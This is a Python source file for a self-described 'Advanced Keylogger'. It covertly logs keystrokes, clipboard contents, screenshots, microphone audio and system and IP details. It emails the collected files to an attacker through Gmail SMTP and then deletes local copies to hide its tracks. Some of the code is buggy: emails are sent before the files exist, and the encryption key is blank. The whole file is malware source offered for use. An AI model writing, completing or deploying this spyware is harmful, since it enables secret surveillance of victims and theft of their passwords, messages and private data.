# keylogger.py
# Advanced Keylogger in Python
# Author: Iheb Msd
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
import getpass
from requests import get
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener
from multiprocessing import process, freeze_support
from PIL import ImageGrab

# variables

keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
audio_information = "audio.wav"
kie = "kl.txt"
sie = "sie.txt"
cie = "cie.txt"
username = getpass.getuser()
file_path = "C:\\Users\\citoy\\PycharmProjects\\KeyLogger2"
extend = "\\"
microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3
key = ""

# send email

email_adress = ""
password = ""
toaddr = ""

def send_email(filename, attachment, toaddr):
    fromaddr = email_adress
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "body of the email"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment: filename = %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

for i in [keys_information, system_information, clipboard_information, audio_information, screenshot_information]:
    send_email(i, file_path + extend + i, toaddr)

# computer information

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPaddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP adress : " + public_ip)
        except Exception:
            f.write("error getting the Public ip adress\n")
        f.write("Processor : " + platform.processor() + "\n")
        f.write("system : " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine : " + platform.machine() + "\n")
        f.write("hostname : " + hostname + "\n")
        f.write("Private IP adress :" + IPaddr + "\n")

computer_information()

# clipboard information = presse papier

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("clipboard data :\n" + pasted_data)
        except:
            f.write("clipboard could not be copied")

copy_clipboard()

# record the mic

def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs, myrecording)

microphone()

# get a screenshot

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()

# time for keylogger

number_of_iterations = 0
current_time = time.time()
stopping_time = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:
    count = 0
    keys = []

    def on_press(key):
        global keys, count, current_time
        print(key)
        keys.append(key)
        count += 1
        current_time = time.time()
        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write("\n")
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if current_time > stopping_time:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if current_time > stopping_time:
        with open(file_path + extend + keys_information, "w") as f:
            f.write("")

        number_of_iterations += 1
        current_time = time.time()
        stopping_time = current_time + time_iteration

# encrypting the data collected

files_to_encrypt = [file_path + extend + system_information, file_path + extend + clipboard_information,file_path + extend + keys_information]
encrypted_file_names = [file_path + extend + sie, file_path + extend + cie, file_path + extend + kie]

count = 0

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)

# clean tracks

delete_files = [system_information, clipboard_information, keys_information, screenshot_information,audio_information]
for file in delete_files:
   os.remove(file_path + extend + file)
